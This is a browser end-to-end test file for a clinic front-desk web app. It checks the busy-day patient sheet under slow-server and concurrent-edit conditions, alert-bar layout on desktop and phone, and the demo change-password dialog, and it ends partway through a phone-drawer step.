await step('busy day, slow server: after an Mr# and Enter the person clicks into a row lower down and types before the add comes back: that row does not move, the new patient waits (the note counts them) and comes in once the cursor leaves the list', async () => {
  await pb.mouse.move(5, 5);
  await pb.evaluate(() => { document.activeElement?.blur(); document.querySelector('.sheet-wrap').scrollTop = 0; });
  await pb.waitForFunction(sortedLikeTheSheet, null, { timeout: 15000 });
  const mr = await freeMr();
  // (the visit is saved at once and its answer arrives 1.5 s later, as on a slow connection)
  await pb.evaluate(async () => {
    const { state } = await import('/js/state.js');
    const d = state.data;
    window.__realAddVisit ||= d.addVisit;
    window.__addAnswered = 0;
    d.addVisit = async (...a) => { const v = await window.__realAddVisit.apply(d, a); await new Promise((r) => setTimeout(r, 1500)); window.__addAnswered += 1; return v; };
  });
  // a Completed row (below the waiting patients, where the new patient goes)
  const name = await pb.evaluate(() => [...document.querySelectorAll('table.sheet tbody tr:not(.is-checkup)')]
    .filter((t) => t.querySelector('select[aria-label^="Status for"]').value === 'completed').map((t) => t.querySelector('.name-text').textContent)
    .filter((n) => /^Sample Patient \d+$/.test(n) && !['Sample Patient 060', 'Sample Patient 081', 'Sample Patient 099'].includes(n))[10]);
  const row = pb.locator('table.sheet tbody tr', { has: pb.locator(`.name-text:text-is("${name}")`) });
  const details = row.locator('input[aria-label^="Treatment details for"]');
  const box = pb.locator('.add-panel input[type=search]');
  await box.fill(mr);
  await box.press('Enter');
  await details.click();
  await pb.keyboard.press('End');
  await pb.keyboard.type(' U L 018');
  const at = () => row.evaluate((tr) => ({ y: Math.round(tr.getBoundingClientRect().top), n: tr.querySelector('td.rownum').textContent, cursorIn: tr.contains(document.activeElement) }));
  const before = await at();
  await pb.waitForFunction(() => window.__addAnswered > 0, null, { timeout: 10000 });
  await pb.waitForTimeout(300);
  assert.deepEqual(await at(), before, 'the row with the cursor did not move');
  assert.equal(await pb.locator('table.sheet tbody tr', { hasText: `Mr# ${mr}` }).count(), 0, 'the new patient waits');
  assert.equal(await pb.locator('.sheet-new-rows').innerText(), '1 new row, it appears when you leave the list');
  await pb.keyboard.type(' PC');
  assert.match(await details.inputValue(), / U L 018 PC$/, 'what is typed stays');
  await pb.locator('input[aria-label="Find on this list"]').focus();
  await pb.locator('table.sheet tbody tr', { hasText: `Mr# ${mr}` }).waitFor({ timeout: 15000 });
  assert.equal(await pb.locator('table.sheet tbody tr', { hasText: `Mr# ${mr}` }).count(), 1, 'one row for them');
  assert.ok(await pb.evaluate(sortedLikeTheSheet), 'sorted like the sheet');
  await pb.evaluate(async () => { const { state } = await import('/js/state.js'); state.data.addVisit = window.__realAddVisit; document.activeElement?.blur(); });
});
await step('busy day, slow server: a reload that already has the patient just added by Mr# (it read the list after the visit was saved, before the add answered) leaves one row for them, not two', async () => {
  await pb.mouse.move(5, 5);
  await pb.evaluate(() => document.activeElement?.blur());
  const mr = await freeMr();
  await pb.evaluate(async () => {
    const { state } = await import('/js/state.js');
    const d = state.data;
    window.__realAddVisit ||= d.addVisit;
    window.__addSaved = 0;
    window.__addAnswered = 0;
    d.addVisit = async (...a) => { const v = await window.__realAddVisit.apply(d, a); window.__addSaved += 1; await new Promise((r) => setTimeout(r, 1500)); window.__addAnswered += 1; return v; };
  });
  const all = () => pb.evaluate(() => Number(document.querySelector('.sheet-counts button[data-key=""] strong').textContent));
  const box = pb.locator('.add-panel input[type=search]');
  await box.fill(mr);
  await box.press('Enter');
  await pb.waitForFunction(() => window.__addSaved > 0, null, { timeout: 10000 });
  await pb.evaluate(() => document.dispatchEvent(new CustomEvent('sheet-reload'))); // (another computer's change, or the live echo of this one)
  await pb.waitForFunction(() => window.__addAnswered > 0, null, { timeout: 10000 });
  await pb.waitForFunction((m) => document.activeElement?.matches('input[aria-label^="Treatment for"]') && document.activeElement.closest('tr').textContent.includes(`Mr# ${m}`), mr, { timeout: 5000 });
  await pb.waitForTimeout(300);
  assert.equal(await pb.locator('table.sheet tbody tr', { hasText: `Mr# ${mr}` }).count(), 1, 'one row for them');
  assert.equal(await all(), await pb.locator('table.sheet tbody tr[data-id]').count(), 'the "All" count is the rows shown');
  await pb.evaluate(async () => { const { state } = await import('/js/state.js'); state.data.addVisit = window.__realAddVisit; document.activeElement?.blur(); });
});
await step('busy day, slow server: a reload in the background asked while another day is on its way shows that day, never the old day\'s rows under the new date', async () => {
  await pb.mouse.move(5, 5);
  await pb.evaluate(() => document.activeElement?.blur());
  const name = (await spareWaiting())[3];
  const treatment = pb.locator('table.sheet tbody tr', { has: pb.locator(`.name-text:text-is("${name}")`) }).locator('input[aria-label^="Treatment for"]');
  await treatment.click();
  await pb.keyboard.press('End');
  // (the list answers 0.8 s after it is asked for, as on a real connection)
  const yesterday = await pb.evaluate(async () => {
    const { state } = await import('/js/state.js');
    const { localISO } = await import('/js/ui/dom.js');
    const d = state.data;
    window.__realListVisits ||= d.listVisits;
    d.listVisits = async (args) => { const list = await window.__realListVisits.call(d, args); await new Promise((r) => setTimeout(r, 800)); return list; };
    const day = new Date();
    day.setDate(day.getDate() - 1);
    return localISO(day);
  });
  await pb.locator('input[aria-label="Date"]').fill(yesterday);
  await pb.waitForTimeout(300);
  await pb.evaluate(() => document.dispatchEvent(new CustomEvent('sheet-reload'))); // (a live update from another computer)
  await pb.waitForTimeout(2000);
  const want = await pb.evaluate(async (day) => (await window.__realListVisits.call((await import('/js/state.js')).state.data, { branchId: 1, date: day })).map((v) => v.id).sort(), yesterday);
  const got = await pb.evaluate(() => [...document.querySelectorAll('table.sheet tbody tr[data-id]:not(.is-checkup)')].map((t) => t.dataset.id).sort());
  assert.equal(await pb.locator('input[aria-label="Date"]').inputValue(), yesterday);
  assert.deepEqual(got, want, 'the rows of the day in the date picker');
  assert.equal(await pb.locator('table.sheet tbody tr', { hasText: name }).count(), 0, 'none of today\'s rows');
  await pb.evaluate(async () => { const { state } = await import('/js/state.js'); state.data.listVisits = window.__realListVisits; });
  await pb.getByRole('button', { name: 'Today', exact: true }).click();
  await pb.waitForFunction(() => document.querySelectorAll('table.sheet tbody tr').length >= 120, null, { timeout: 15000 });
  await pb.evaluate(() => document.activeElement?.blur());
});
await step('busy day: while a dialog is open (and while the cursor is in the table after it) a row removed on another computer stays, with no empty line; it goes once the person is done, and at once when nobody is working in the table', async () => {
  await pb.mouse.move(5, 5);
  await pb.evaluate(() => document.activeElement?.blur());
  await pb.waitForFunction(sortedLikeTheSheet, null, { timeout: 15000 });
  const waiting = await spareWaiting();
  const nameRow = (n) => pb.locator('table.sheet tbody tr', { has: pb.locator(`.name-text:text-is("${n}")`) });
  const removeElsewhere = (names) => pb.evaluate((gone) => import('/js/state.js').then(({ state }) => {
    const d = state.data;
    window.__realListVisits ||= d.listVisits;
    d.listVisits = async (args) => (await window.__realListVisits.call(d, args)).filter((v) => !gone.includes(v.patient.full_name));
    document.dispatchEvent(new CustomEvent('sheet-reload'));
  }), names);
  // the row's dialog is open
  await nameRow(waiting[8]).locator('.name-btn').click();
  await pb.locator(`.modal h2:has-text("${waiting[8]}")`).waitFor();
  const order = await listOrder();
  await removeElsewhere([waiting[3]]);
  await pb.waitForTimeout(1000);
  assert.equal(await nameRow(waiting[3]).count(), 1, 'still on the list while the dialog is open');
  assert.deepEqual(await listOrder(), order, 'no row moved');
  // the dialog closes: the cursor is back on the name, in the table, so it still waits
  await pb.keyboard.press('Escape');
  await pb.waitForSelector('.modal', { state: 'detached' });
  assert.equal(await pb.evaluate(() => document.activeElement?.closest('tr')?.querySelector('.name-text')?.textContent), waiting[8]);
  await pb.waitForTimeout(500);
  assert.equal(await nameRow(waiting[3]).count(), 1, 'still on the list with the cursor in the table');
  assert.equal(await pb.locator('tr.gone-row').count(), 0, 'no empty line');
  // the cursor leaves the table: it goes
  await pb.locator('input[aria-label="Find on this list"]').focus();
  await nameRow(waiting[3]).waitFor({ state: 'detached', timeout: 15000 });
  assert.ok(await pb.evaluate(sortedLikeTheSheet));
  // nobody working in the table (more than 5 seconds since the last click in it): the next one goes at once
  await pb.evaluate(() => document.activeElement?.blur());
  await pb.waitForTimeout(5200);
  await removeElsewhere([waiting[3], waiting[5]]);
  await nameRow(waiting[5]).waitFor({ state: 'detached', timeout: 3000 });
  await pb.evaluate(async () => { const { state } = await import('/js/state.js'); state.data.listVisits = window.__realListVisits; });
});
await step('busy day: a status or group chosen with the arrow keys and not saved yet is never saved by its row being drawn again or by a reload (nor when the control is taken out of the page); Escape undoes it, Enter saves it', async () => {
  await pb.mouse.move(5, 5);
  await pb.evaluate(() => document.activeElement?.blur());
  // (the answer to a group change comes 1.5 s later)
  await pb.evaluate(async () => {
    const { state } = await import('/js/state.js');
    const d = state.data;
    window.__realUpdateVisit ||= d.updateVisit;
    d.updateVisit = async (id, changes) => { const answer = await window.__realUpdateVisit.call(d, id, changes); if ('doctor_group_id' in changes) await new Promise((r) => setTimeout(r, 1500)); return answer; };
  });
  const waiting = await spareWaiting();
  const name = waiting[4];
  const row = pb.locator('table.sheet tbody tr', { has: pb.locator(`.name-text:text-is("${name}")`) });
  const status = row.locator('select[aria-label^="Status for"]');
  const group = row.locator('select[aria-label^="Doctor group for"]');
  const savedStatus = () => pb.evaluate(async (n) => {
    const { state } = await import('/js/state.js');
    const { localISO } = await import('/js/ui/dom.js');
    return (await state.data.listVisits({ branchId: 1, date: localISO() })).find((v) => v.patient.full_name === n).status;
  }, name);
  const focused = () => status.evaluate((el) => el === document.activeElement);
  // a group picked with the mouse; before its answer comes, the status is chosen with the arrow keys and not saved
  await group.selectOption((await group.inputValue()) === '2' ? '1' : '2');
  await row.evaluate((tr) => { tr.querySelector('td.pp').dataset.before = 'yes'; });
  await status.focus();
  await pb.keyboard.press('ArrowDown');
  const preview = await status.inputValue();
  assert.equal(preview, 'in_treatment', 'the next status is shown');
  // the group's answer comes: the row's other cells are drawn new, the status keeps what is shown and the cursor
  await pb.waitForFunction((n) => { const tr = [...document.querySelectorAll('table.sheet tbody tr')].find((t) => t.querySelector('.name-text')?.textContent === n); return tr && !tr.querySelector('td.pp').dataset.before; }, name);
  assert.equal(await status.inputValue(), preview);
  assert.ok(await focused(), 'the cursor is still on the status');
  assert.equal(await savedStatus(), 'waiting', 'not saved by the row being drawn again');
  // a reload in the background, with another row changed on another computer
  await elsewhere({ [waiting[6]]: 'in_treatment' });
  await pb.waitForFunction((n) => [...document.querySelectorAll('table.sheet tbody tr')].find((t) => t.querySelector('.name-text')?.textContent === n)?.querySelector('select[aria-label^="Status for"]').value === 'in_treatment', waiting[6]);
  await pb.waitForTimeout(500);
  assert.equal(await status.inputValue(), preview);
  assert.ok(await focused());
  assert.equal(await savedStatus(), 'waiting', 'not saved by the reload');
  // Escape undoes it; then Enter saves the one chosen
  await pb.keyboard.press('Escape');
  assert.equal(await status.inputValue(), 'waiting');
  await pb.keyboard.press('ArrowDown');
  await pb.keyboard.press('Enter');
  for (let i = 0; i < 25 && (await savedStatus()) !== 'in_treatment'; i++) await pb.waitForTimeout(200);
  assert.equal(await savedStatus(), 'in_treatment', 'saved with Enter');
  // a control taken out of the page while something not saved is shown in it (Chrome then fires its blur) saves nothing;
  // a real leave does
  const blurs = await pb.evaluate(async () => {
    const { commitOnFinish } = await import('/js/views/staff/common.js');
    const make = () => {
      const s = document.createElement('select');
      for (const v of ['a', 'b']) s.append(new Option(v, v));
      document.body.append(s);
      const saved = [];
      commitOnFinish(s, (v) => saved.push(v));
      s.focus();
      s.dispatchEvent(new KeyboardEvent('keydown', { key: 'ArrowDown', bubbles: true }));
      s.value = 'b';
      s.dispatchEvent(new Event('change', { bubbles: true }));
      return [s, saved];
    };
    const [gone, savedGone] = make();
    gone.remove();
    const [left, savedLeft] = make();
    const other = document.createElement('button');
    document.body.append(other);
    other.focus();
    await new Promise((r) => setTimeout(r, 50));
    left.remove(); other.remove();
    return { removed: savedGone, left: savedLeft };
  });
  assert.deepEqual(blurs, { removed: [], left: ['b'] });
  await pb.evaluate(async () => { const { state } = await import('/js/state.js'); state.data.updateVisit = window.__realUpdateVisit; document.activeElement?.blur(); });
});
await step('round 5: a checkup patient\'s Group cell shows a dash, read out as "Checkup patients have no group"', async () => {
  const cells = await pb.evaluate(() => [...document.querySelectorAll('table.sheet tbody tr.is-checkup')].map((tr) => {
    const c = tr.children[[...document.querySelectorAll('table.sheet thead th:not([hidden])')].findIndex((th) => th.textContent.replace('▾', '').trim() === 'Group')];
    const dash = c.querySelector('.no-group');
    return { shown: dash?.querySelector('[aria-hidden="true"]')?.textContent, title: dash?.title, read: c.querySelector('.sr-only')?.textContent, select: !!c.querySelector('select') };
  }));
  assert.ok(cells.length >= 1, 'checkup rows: ' + cells.length);
  for (const c of cells) assert.deepEqual(c, { shown: '—', title: 'Checkup patients have no group', read: 'Checkup patients have no group', select: false });
});
await step('round 5: the Group drop-down offers the groups of Clinic setup; a group the Google Sheet names that Clinic setup does not have ("Group 4") is shown greyed, "Add this group in Clinic setup", and "No group" next to it saves nothing', async () => {
  const sel = pb.locator('table.sheet tbody tr', { has: pb.locator('.name-text:text-is("Sample Patient 099")') }).locator('select[aria-label^="Doctor group for"]');
  const look = () => sel.evaluate((s) => ({ shown: s.selectedOptions[0].textContent, disabled: s.selectedOptions[0].disabled, unknown: s.classList.contains('group-unknown'), grey: s.classList.contains('gs-grey'),
    title: s.title, style: getComputedStyle(s).fontStyle }));
  assert.deepEqual(await look(), { shown: 'Group 4', disabled: true, unknown: true, grey: true, title: 'Add this group in Clinic setup', style: 'italic' });
  const setup = await pb.evaluate(async () => { const { state } = await import('/js/state.js'); return state.ref.groups.map((g) => g.name); });
  assert.deepEqual(await sel.evaluate((s) => [...s.options].map((o) => o.textContent)), ['Group 4', 'No group', ...setup]);
  const other = await pb.locator('table.sheet tbody tr:not(.is-checkup) select[aria-label^="Doctor group for"]').first().evaluate((s) => [...s.options].map((o) => o.textContent));
  assert.deepEqual(other, ['No group', ...setup], 'the other rows: No group and the groups of Clinic setup');
  // the arrow keys show "No group"; Escape brings the sheet's words back; leaving saves nothing
  await sel.focus();
  await pb.keyboard.press('ArrowDown');
  assert.deepEqual(await look(), { shown: 'No group', disabled: false, unknown: false, grey: true, title: '', style: 'normal' });
  await pb.keyboard.press('Escape');
  assert.equal((await look()).shown, 'Group 4');
  await pb.keyboard.press('ArrowDown');
  await pb.locator('input[aria-label="Find on this list"]').focus();
  await pb.waitForTimeout(300);
  const saved = await pb.evaluate(async () => {
    const { state } = await import('/js/state.js');
    const { localISO } = await import('/js/ui/dom.js');
    const v = (await state.data.listVisits({ branchId: 1, date: localISO() })).find((x) => x.patient.full_name === 'Sample Patient 099');
    return [v.doctor_group_id, v.sheet_cells?.group?.t];
  });
  assert.deepEqual(saved, [null, 'Group 4'], 'nothing saved');
  await shot(pb, '24-sheet-group-unknown');
  await pb.evaluate(() => document.activeElement?.blur());
});
await step('busy day at 1366x768: the bars that come and go (the Undo of a removed doctor, a warning, the changes not saved) are on the line of the counts and never move the list, nor cover it or the save status; a second click where a doctor was removed takes nobody from another patient; the Undo stays while the cursor is in the list; the changes not saved are one line, with Show opening over the list', async () => {
  await pb.mouse.move(5, 5);
  await pb.evaluate(() => { document.activeElement?.blur(); document.querySelector('.sheet-wrap').scrollTop = 0; });
  const wrapTop = () => pb.locator('.sheet-wrap').evaluate((w) => Math.round(w.getBoundingClientRect().top));
  const onLine = (bar) => bar.evaluate((el) => {
    const b = el.getBoundingClientRect();
    const line = document.querySelector('.sheet-subhead').getBoundingClientRect();
    const w = document.querySelector('.sheet-wrap').getBoundingClientRect();
    const s = document.querySelector('.save-status').getBoundingClientRect();
    const c = document.querySelector('.sheet-counts').getBoundingClientRect();
    const hits = (r) => !(b.right <= r.left || b.left >= r.right || b.bottom <= r.top || b.top >= r.bottom);
    return { onCountsLine: b.top >= line.top - 0.5 && b.bottom <= line.bottom + 0.5, aboveList: b.bottom <= w.top + 0.5, coversSave: hits(s), coversCounts: hits(c) };
  });
  const onLineOk = { onCountsLine: true, aboveList: true, coversSave: false, coversCounts: false };
  const people = () => pb.evaluate(() => Object.fromEntries([...document.querySelectorAll('table.sheet tbody tr[data-id]')].map((tr) => [tr.dataset.id, [...tr.querySelectorAll('.person')].map((p) => p.title).join(', ')])));
  const top0 = await wrapTop();
  const line0 = await pb.locator('.sheet-subhead').evaluate((el) => Math.round(el.getBoundingClientRect().height));
  // a doctor chip's × (Sample Patient 081 has a doctor): the Undo bar comes on the line of the counts, and the list stays put
  const r81 = pb.locator('table.sheet tbody tr', { has: pb.locator('.name-text:text-is("Sample Patient 081")') });
  const id81 = await r81.getAttribute('data-id');
  await r81.locator('.person').first().hover();
  const x = await r81.locator('.person .chip-remove').first().boundingBox();
  const at = { x: x.x + x.width / 2, y: x.y + x.height / 2 };
  const before = await people();
  await pb.mouse.click(at.x, at.y);
  const undoBar = pb.locator('.sheet-bars .alert-info', { hasText: 'removed from Sample Patient 081.' });
  await undoBar.waitFor();
  assert.deepEqual(await onLine(undoBar), onLineOk, 'the Undo bar');
  assert.equal(await wrapTop(), top0, 'the list did not move');
  assert.equal(await pb.locator('.sheet-subhead').evaluate((el) => Math.round(el.getBoundingClientRect().height)), line0, 'the line of the counts is as tall as before');
  assert.equal(await pb.evaluate(({ x, y }) => document.elementFromPoint(x, y)?.closest('tr')?.dataset.id, at), id81, 'the same patient\'s row is under the mouse');
  // a second click at the same place (a double click, or going for the next chip) takes nobody from another patient
  await pb.waitForTimeout(80);
  await pb.mouse.click(at.x, at.y);
  await pb.waitForTimeout(500);
  const after = await people();
  assert.deepEqual(Object.keys(before).filter((id) => id !== id81 && before[id] !== after[id]), [], 'no other patient lost a doctor');
  await undoBar.getByRole('button', { name: 'Undo' }).click();
  await undoBar.waitFor({ state: 'hidden' });
  assert.equal(await wrapTop(), top0, 'and the list stays put when the bar goes');
  // removed again, then the cursor in another row's Treatment Details: the Undo stays past its 10 seconds while the cursor
  // is in the list (nothing moves), and goes once the person has left the list
  await pb.mouse.move(5, 5);
  await r81.locator('.person').first().hover();
  await r81.locator('.person .chip-remove').first().click();
  await undoBar.waitFor();
  const details = pb.locator('table.sheet tbody tr', { has: pb.locator(`.name-text:text-is("${(await spareWaiting())[1]}")`) }).locator('input[aria-label^="Treatment details for"]');
  await details.click();
  await pb.keyboard.press('End');
  await pb.keyboard.type(' x');
  const y0 = await details.evaluate((el) => Math.round(el.getBoundingClientRect().top));
  await pb.waitForTimeout(10500);
  assert.ok(await undoBar.isVisible(), 'the Undo is still there while the cursor is in the list');
  assert.equal(await details.evaluate((el) => Math.round(el.getBoundingClientRect().top)), y0, 'the field with the cursor did not move');
  await pb.locator('input[aria-label="Find on this list"]').focus();
  await undoBar.waitFor({ state: 'hidden', timeout: 10000 });
  assert.equal(await wrapTop(), top0, 'the list did not move when it went');
  // the checkup patients fail to load on one reload and load on the next: the warning comes and goes on the line of the counts
  await pb.evaluate(async () => {
    const { state } = await import('/js/state.js');
    const d = state.data;
    window.__realDayCheckups ||= d.listDayCheckups;
    d.listDayCheckups = async () => { d.listDayCheckups = window.__realDayCheckups; throw new Error('The checkup list did not answer.'); };
    document.activeElement?.blur();
    document.dispatchEvent(new CustomEvent('sheet-reload'));
  });
  const warn = pb.locator('.sheet-bars .alert-warning', { hasText: 'Checkup patients could not be loaded' });
  await warn.waitFor({ timeout: 10000 });
  assert.deepEqual(await onLine(warn), onLineOk, 'the warning');
  assert.equal(await wrapTop(), top0);
  await pb.evaluate(() => document.dispatchEvent(new CustomEvent('sheet-reload')));
  await warn.waitFor({ state: 'hidden' });
  assert.equal(await wrapTop(), top0);
  // a typed change the server refuses: one line (what, Try again, Show); Show lists it with Discard, over the list
  await pb.evaluate(async () => {
    const { state } = await import('/js/state.js');
    const d = state.data;
    window.__realUpdateVisit ||= d.updateVisit;
    d.updateVisit = async (id, changes) => { if ('details_text' in changes) throw new Error('Sample: the server refused this change'); return window.__realUpdateVisit.call(d, id, changes); };
  });
  const refused = pb.locator('table.sheet tbody tr', { has: pb.locator('.name-text:text-is("Sample Patient 060")') }).locator('input[aria-label^="Treatment details for"]');
  await refused.click();
  await pb.keyboard.press('End');
  await pb.keyboard.type(' x');
  const fails = pb.locator('#sheet-save-failures');
  await fails.waitFor({ timeout: 10000 });
  assert.deepEqual(await onLine(fails), onLineOk, 'the changes not saved');
  assert.equal(await wrapTop(), top0, 'the list did not move while the cursor is in it');
  await pb.locator('input[aria-label="Find on this list"]').focus();
  assert.match(await fails.locator('.sheet-fails-summary').innerText(), /^Not saved yet: Sample Patient 060, Treatment details ".+ x"\.$/);
  assert.ok(await fails.getByRole('button', { name: 'Try again', exact: true }).isVisible(), 'Try again on the line');
  assert.ok(await fails.locator('.sheet-fails-list').isHidden(), 'the list is closed');
  const show = fails.getByRole('button', { name: 'Show' });
  assert.equal(await show.getAttribute('aria-expanded'), 'false');
  await show.click();
  assert.equal(await fails.getByRole('button', { name: 'Hide' }).getAttribute('aria-expanded'), 'true');
  const open = await fails.locator('.sheet-fails-list').evaluate((el) => {
    const b = el.getBoundingClientRect();
    const line = document.querySelector('.sheet-subhead').getBoundingClientRect();
    const hit = document.elementFromPoint(b.left + b.width / 2, b.top + Math.min(b.height / 2, 12));
    return { underLine: b.top >= line.bottom - 0.5, onTop: el.contains(hit), inSight: b.left >= 0 && b.right <= window.innerWidth };
  });
  assert.deepEqual(open, { underLine: true, onTop: true, inSight: true }, 'opened over the list, under the line');
  assert.equal(await wrapTop(), top0, 'the list did not move');
  await pb.keyboard.press('Escape');
  assert.ok(await fails.locator('.sheet-fails-list').isHidden(), 'Escape closes it');
  assert.ok(await show.evaluate((el) => el === document.activeElement), 'and focus is back on Show');
  await show.click();
  await fails.getByRole('button', { name: /^Discard: Sample Patient 060/ }).click();
  await pb.locator('.modal').getByRole('button', { name: 'Discard', exact: true }).click();
  await fails.waitFor({ state: 'hidden' });
  await pb.evaluate(async () => { const { state } = await import('/js/state.js'); state.data.updateVisit = window.__realUpdateVisit; document.activeElement?.blur(); });
  await pb.waitForTimeout(300);
  assert.equal(await wrapTop(), top0, 'the list is where it was');
  await shot(pb, '24-sheet-bars-line');
});
await step('busy day on a phone (390px, touch, 44px rows): every chip\'s × is in sight and takes the tap, and a name cut short is whole in the tooltip', async () => {
  const pt = await newPage({ width: 390, height: 844 }, { isMobile: true, hasTouch: true });
  await loginAs(pt, 'Front desk \\(Gulshan\\)');
  await pt.goto(BASE + '#/staff/sheet?demo=busy');
  await pt.waitForFunction(() => document.querySelectorAll('table.sheet tbody tr').length >= 120);
  const c = await pt.evaluate(checkChips);
  assert.ok(c.n >= 140, 'chips: ' + JSON.stringify(c));
  assert.deepEqual(c.blocked, [], 'a × that cannot be tapped');
  assert.deepEqual(c.unreadable, [], 'a name that cannot be read');
  // The list's fields are 16px here (iOS zooms into a smaller field on every tap), and the Status and Group chips are wide
  // enough for their words in that size.
  const fields = await pt.evaluate(() => {
    const canvas = document.createElement('canvas').getContext('2d');
    const out = { sizes: {}, cut: [] };
    const sel = { treatment: 'input[aria-label^="Treatment for"]', details: 'input[aria-label^="Treatment details for"]', name: 'input[aria-label^="Name of checkup patient"]',
      token: 'input[aria-label^="Token of checkup patient"]', phone: 'input[aria-label^="Phone for"]', status: 'select[aria-label^="Status for"]', group: 'select[aria-label^="Doctor group for"]' };
    for (const [k, s] of Object.entries(sel)) {
      const els = [...document.querySelectorAll(`table.sheet tbody ${s}`)];
      out.sizes[k] = els.length ? Math.min(...els.map((el) => parseFloat(getComputedStyle(el).fontSize))) : 0;
      for (const el of els.filter((x) => x.tagName === 'SELECT')) {
        const cs = getComputedStyle(el);
        canvas.font = `${cs.fontWeight} ${cs.fontSize} ${cs.fontFamily}`;
        const words = el.options[el.selectedIndex].text;
        if (canvas.measureText(words).width > el.clientWidth - parseFloat(cs.paddingLeft) - parseFloat(cs.paddingRight) + 0.5) out.cut.push(words);
      }
    }
    out.cut = [...new Set(out.cut)];
    return out;
  });
  for (const [k, px] of Object.entries(fields.sizes)) assert.ok(px >= 16, `${k} cells: ${px}px`);
  assert.deepEqual(fields.cut, [], 'chip words cut short');
  // the Filters panel opens on the screen, and the page does not scroll sideways
  await pt.getByRole('button', { name: 'Filters', exact: true }).click();
  const f = await pt.evaluate(() => { const r = document.querySelector('#sheet-filter-panel').getBoundingClientRect(); return { left: Math.round(r.left), right: Math.round(r.right), sideScroll: document.documentElement.scrollWidth > window.innerWidth + 1 }; });
  assert.ok(f.left >= 0 && f.right <= 390 && !f.sideScroll, 'the Filters panel is on the screen: ' + JSON.stringify(f));
  await pt.close();
});
await pb.close(); // (the busy list is not used again)

// ------------------------------------------------------------- change password (account menu and phone drawer)
// The demo has no real passwords: the first current password is accepted whatever it is, the one chosen is remembered for the page.
const pw = await newPage();
const changeDialog = (pg) => pg.locator('.modal');
const changeField = (pg, label) => changeDialog(pg).locator(`.field:has(label:text-is("${label}"))`);
const changeFill = async (pg, current, next, again) => {
  await changeDialog(pg).getByLabel('Current password', { exact: true }).fill(current);
  await changeDialog(pg).getByLabel('New password', { exact: true }).fill(next);
  await changeDialog(pg).getByLabel('Type the new password again', { exact: true }).fill(again);
};
const changeSubmit = (pg) => changeDialog(pg).getByRole('button', { name: 'Change password', exact: true }).click();
const changeOpen = async (pg, { wait = true } = {}) => {
  await pg.locator('.user-menu > button').click();
  await pg.locator('.user-menu .menu-list button:has-text("Change password")').click();
  if (wait) await pg.waitForSelector('.modal h2:has-text("Change password")');
};
await step('staff: "Change password" is in the account menu above "Log out" and opens the dialog with its three fields', async () => {
  await loginAs(pw, 'Front desk \\(Gulshan\\)');
  await pw.locator('.user-menu > button').click();
  const items = (await pw.locator('.user-menu .menu-list button').allTextContents()).map((t) => t.trim());
  assert.deepEqual(items, ['Change password', 'Log out']);
  await pw.locator('.user-menu .menu-list button:has-text("Change password")').click();
  await pw.waitForSelector('.modal h2:has-text("Change password")');
  assert.equal(await pw.locator('.user-menu.open').count(), 0, 'the menu closed behind the dialog');
  assert.equal(await changeDialog(pw).getByLabel('Current password', { exact: true }).getAttribute('autocomplete'), 'current-password');
  assert.equal(await changeDialog(pw).getByLabel('New password', { exact: true }).getAttribute('autocomplete'), 'new-password');
  assert.equal(await changeDialog(pw).getByLabel('Type the new password again', { exact: true }).getAttribute('autocomplete'), 'new-password');
  assert.match(await changeField(pw, 'New password').innerText(), /At least 8 characters/);
  assert.equal(await changeDialog(pw).locator('input[type=password]').count(), 3);
  await changeDialog(pw).getByLabel('Show the new password').check();
  assert.equal(await changeDialog(pw).locator('input[type=password]').count(), 1, 'the box shows the two new passwords as typed');
  assert.equal(await changeDialog(pw).getByLabel('Current password', { exact: true }).getAttribute('type'), 'password',
    'the current password stays hidden (a browser may have filled in a saved one)');
  await changeDialog(pw).getByLabel('Show the new password').uncheck();
  assert.equal(await changeDialog(pw).locator('input[type=password]').count(), 3);
  await shot(pw, '14-change-password');
  await pw.keyboard.press('Escape');
  await pw.waitForSelector('.modal', { state: 'detached' });
  assert.ok(await pw.evaluate(() => document.activeElement?.closest('.user-menu') !== null), 'focus is back on the account button');
});
await step('empty, short and mismatching entries are refused next to the field, nothing is sent', async () => {
  await changeOpen(pw);
  await changeSubmit(pw);
  for (const label of ['Current password', 'New password', 'Type the new password again']) assert.ok(await changeField(pw, label).locator('.field-error').count(), `${label} says what is missing`);
  await changeFill(pw, 'old-pass-1', 'short', 'short');
  await changeSubmit(pw);
  assert.match(await changeField(pw, 'New password').locator('.field-error').innerText(), /at least 8 characters/);
  await changeFill(pw, 'old-pass-1', 'brand-new-pass-1', 'brand-new-pass-2');
  await changeSubmit(pw);
  assert.match(await changeField(pw, 'Type the new password again').locator('.field-error').innerText(), /not the same/);
  assert.equal(await changeField(pw, 'New password').locator('.field-error').count(), 0, 'the error is next to the field that is wrong');
  assert.equal(await pw.locator('.toast:has-text("Password changed")').count(), 0);
  assert.ok(await changeDialog(pw).count(), 'the dialog is still open');
});
await step('success: the dialog closes, the toast says what to do next time, and the person stays logged in', async () => {
  await changeFill(pw, 'old-pass-1', 'brand-new-pass-1', 'brand-new-pass-1');
  await changeSubmit(pw);
  await pw.waitForSelector('.toast:has-text("Password changed. Use the new password next time you log in.")');
  await pw.waitForSelector('.modal', { state: 'detached' });
  assert.ok(await pw.locator('.topbar').isVisible());
  assert.match(pw.url(), /#\/staff\//);
  await shot(pw, '15-password-changed');
});
await step('a wrong current password says "not right" next to that field; the same new password is refused; the right current one works', async () => {
  await changeOpen(pw);
  await changeFill(pw, 'wrong-old-9', 'second-pass-22', 'second-pass-22');
  await changeSubmit(pw);
  assert.match(await changeField(pw, 'Current password').locator('.field-error').innerText(), /not right/);
  assert.ok(await changeDialog(pw).count(), 'still open, nothing changed');
  await changeFill(pw, 'brand-new-pass-1', 'brand-new-pass-1', 'brand-new-pass-1');
  await changeSubmit(pw);
  assert.match(await changeField(pw, 'New password').locator('.field-error').innerText(), /different/);
  await changeFill(pw, 'brand-new-pass-1', 'second-pass-22', 'second-pass-22');
  await changeDialog(pw).getByLabel('Type the new password again', { exact: true }).press('Enter'); // Enter sends it, like the button
  await pw.waitForSelector('.modal', { state: 'detached' });
  assert.ok(await pw.locator('.toast:has-text("Password changed")').count());
  assert.ok(await pw.locator('.topbar').isVisible(), 'still logged in');
});
const pwPhone = await newPage({ width: 390, height: 844 });
await step('at phone width the drawer shows "Change password" next to "Log out", and the dialog opens from it', async () => {
  await loginAs(pwPhone, 'Front desk \\(Gulshan\\)');
  await pwPhone.locator('.menu-toggle').click();
  await pwPhone.waitForSelector('#staff-drawer.open');
  const items = (await pwPhone.locator('.sidebar-foot button').allTextContents()).map((t) => t.trim());
  assert.deepEqual(items, ['Change password', 'Log out']);
  await shot(pwPhone, '16-drawer-change-password');
  await pwPhone.locator('.sidebar-foot button:has-text("Change password")').click();
